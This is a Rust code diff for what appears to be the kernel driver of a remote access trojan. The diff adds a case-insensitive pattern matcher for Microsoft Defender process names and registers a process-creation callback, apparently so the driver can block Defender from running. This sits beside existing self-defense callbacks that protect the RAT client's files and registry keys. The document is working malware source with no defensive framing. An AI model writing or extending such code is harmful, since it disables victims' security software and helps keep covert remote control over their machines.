@@ -19,11 +19,12 @@ use wdk_sys::{
 use widestring::{U16CStr, u16cstr};
 
 use crate::global::{
-    MAX_INITIALIZE_ATTEMPTS, OB_REGISTER_CALLBACKS_HANDLE, OBJ_PATH_AHO_CORASICK,
-    ORIGINAL_DRIVER_OBJECT, RAT_CLIENT, RAT_CLIENT_OBJ_PATH, RAT_CLIENT_OBJ_PATH_SELF_DEFENSE,
+    MAX_INITIALIZE_ATTEMPTS, MS_DEFENDER_AHO_CORASICK, MS_DEFENDER_PROCESS_PATTERN,
+    OB_REGISTER_CALLBACKS_HANDLE, OBJ_PATH_AHO_CORASICK, ORIGINAL_DRIVER_OBJECT,
+    PROCESS_NOTIFY_ROUTINE, RAT_CLIENT, RAT_CLIENT_OBJ_PATH, RAT_CLIENT_OBJ_PATH_SELF_DEFENSE,
     RAT_CLIENT_SERVICE_PATH, RAT_CLIENT_SERVICE_REGISTRY, RAT_DEVICE_OBJECT,
 };
-use crate::handlers::{device, object};
+use crate::handlers::{device, object, process};
 use crate::wrappers::bindings::InitializeObjectAttributes;
 use crate::wrappers::{fs, registry};
 use crate::{cleanup, error, info};
@@ -145,6 +146,22 @@ fn initialize(extra: &KernelHandoff) -> anyhow::Result<()> {
         error!("Failed to setup service registry: {e}");
     })?;
 
+    // Create Aho-Corasick automaton for MS Defender block
+    let ac = AhoCorasickBuilder::new()
+        .ascii_case_insensitive(true)
+        .build(
+            MS_DEFENDER_PROCESS_PATTERN
+                .iter()
+                .map(|p| u16cstr_to_buf(p)),
+        )
+        .map_err(|e| {
+            error!("Failed to build Aho-Corasick automaton for MS Defender block: {e}");
+            anyhow::anyhow!("Aho-Corasick build error: {e}")
+        })?;
+    cleanup::cleanup_aho_corasick(
+        MS_DEFENDER_AHO_CORASICK.swap(Box::into_raw(Box::new(ac)), Ordering::AcqRel),
+    );
+
     // Create Aho-Corasick automaton for self-defense
     let ac = AhoCorasickBuilder::new()
         .ascii_case_insensitive(true)
@@ -162,6 +179,13 @@ fn initialize(extra: &KernelHandoff) -> anyhow::Result<()> {
         error!("Failed to register object callbacks: {e}");
     })?;
     cleanup::cleanup_object_callbacks(OB_REGISTER_CALLBACKS_HANDLE.swap(ob, Ordering::AcqRel));
+
+    let ps = process::ps_set_create_process_notify_routine_ex(extra).inspect_err(|e| {
+        error!("Failed to register process callbacks: {e}");
+    })?;
+    cleanup::cleanup_process_notify_routine(
+        PROCESS_NOTIFY_ROUTINE.swap(ps as *mut u8, Ordering::AcqRel),
+    );
 
     // Create device object
     let driver = ORIGINAL_DRIVER_OBJECT.load(Ordering::Acquire);
